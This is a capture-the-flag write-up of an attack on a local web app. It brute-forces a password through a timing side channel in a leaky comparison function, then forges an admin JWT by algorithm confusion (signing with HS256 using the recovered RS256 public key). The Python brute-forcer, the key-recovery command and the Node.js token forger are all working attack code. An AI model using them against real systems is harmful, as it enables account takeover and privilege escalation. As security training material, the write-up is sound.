# Cryptographic Attack Documentation: Time Leak & JWT Algorithm Confusion

## Overview
This document details a two-part attack on a web application involving:
1. A timing attack to brute-force a password
2. A JWT algorithm confusion attack to escalate privileges

## Part 1: Timing Attack for Password Brute-force

### Vulnerability Analysis
The application uses an insecure password comparison function:
```python
def is_equal(a, b):
    for i in range(min(len(a), len(b))):
        if a[i] != b[i]:
            return False
        sleep(0.02)  # Time leak vulnerability
        
    if len(a) != len(b):
        return False
    return True
```

### Attack Methodology
1. **Observation**: Each correct character comparison adds 20ms to response time
2. **Strategy**: Test characters sequentially, measuring response times
3. **Implementation**:

```python
import requests
from string import printable
from time import sleep

site = "http://127.0.0.1:1337/login"
username = "spark"
password = ''
session = requests.Session()

def get_password():
    password = ''
    while True:
        for char in printable:
            test_pass = password + char
            payload = {
                'username': username,
                'password': test_pass
            }
            response = session.post(site, data=payload)
            time = response.elapsed.total_seconds()
            
            # If response time indicates more correct characters
            if time > (0.02) * len(test_pass):
                password += char
                print(f"Current progress: {password}")
                break
        else:
            print(f"Final password: {password}")
            return password
```

### Results
- Discovered password: `BHLOUS6969`
- Obtained valid JWT token after successful login

## Part 2: JWT Algorithm Confusion Attack

### Vulnerability Analysis
The JWT verification is vulnerable due to:
```python
decoded = jwt.decode(token, PUBLIC_KEY, algorithms=['RS256', 'HS256'])
```
- Accepts both RS256 (asymmetric) and HS256 (symmetric) algorithms
- Allows potential algorithm substitution

### Attack Steps

#### Step 1: Gather Materials
1. Obtain two valid JWT tokens:
```python
password = 'BHLOUS6969'
session.post(site, data={'username': username, 'password': password})
token1 = session.cookies.get_dict()['token']
sleep(5)
session.post(site, data={'username': username, 'password': password})
token2 = session.cookies.get_dict()['token']
```

#### Step 2: Derive Public Key
Using the `sig2n` tool:
```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```
Output provided two potential public keys in x509 and pkcs1 formats.

#### Step 3: Forge Admin Token
Using Node.js to create a malicious token:
```js
const jwt = require('jsonwebtoken');
const fs = require('fs');

const publicKey = fs.readFileSync('./public.pem');

const payload = {
    username: 'admin',
    role: 'admin',
    exp: Math.floor(Date.now() / 1000) + 3600  // 1 hour expiration
};

const token = jwt.sign(payload, publicKey, { 
    algorithm: 'HS256',
    noTimestamp: true
});

console.log("Forged token:", token);
```

### Final Exploitation
1. Inject forged token into session cookie
2. Access admin endpoint to retrieve flag

## Results
Successfully obtained flag: **CyberSphere{5de38922ba3c8fac6a116b81ef460695}**
